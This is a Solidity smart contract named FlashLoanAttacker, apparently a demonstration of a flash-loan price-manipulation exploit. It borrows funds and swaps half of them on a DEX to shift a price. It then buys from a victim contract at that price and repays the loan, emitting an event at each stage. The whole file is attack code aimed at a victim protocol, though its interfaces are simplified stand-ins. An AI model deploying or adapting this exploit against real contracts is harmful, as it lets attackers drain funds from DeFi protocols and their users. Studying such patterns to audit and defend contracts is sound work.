// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IProvider { function flashLoan(uint256 amount) external; }
interface IVictim { function buyWithPrice() external payable; }
interface IDEX { function swapETHForTokens() external payable; }

contract FlashLoanAttacker {
    IProvider public provider;
    IVictim public victim;
    IDEX public dex;
    uint256 public loanAmount;

    event AttackStarted(uint256 loanAmount);
    event PriceManipulated();
    event TokensBought(uint256 ethSpent);
    event AttackFinished(uint256 profit);

    constructor(address _victim, address _provider, address _dex) payable {
        victim = IVictim(_victim);
        provider = IProvider(_provider);
        dex = IDEX(_dex);
    }

    function attack(uint256 _loanAmount) external {
        loanAmount = _loanAmount;
        emit AttackStarted(_loanAmount);
        provider.flashLoan(_loanAmount);
        emit AttackFinished(address(this).balance);
    }

    function executeFlashLoan(uint256 amount) external payable {
        dex.swapETHForTokens{value: amount / 2}();
        emit PriceManipulated();
        uint256 buyAmount = amount / 4;
        victim.buyWithPrice{value: buyAmount}();
        emit TokensBought(buyAmount);
        payable(address(provider)).transfer(amount);
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {}
}
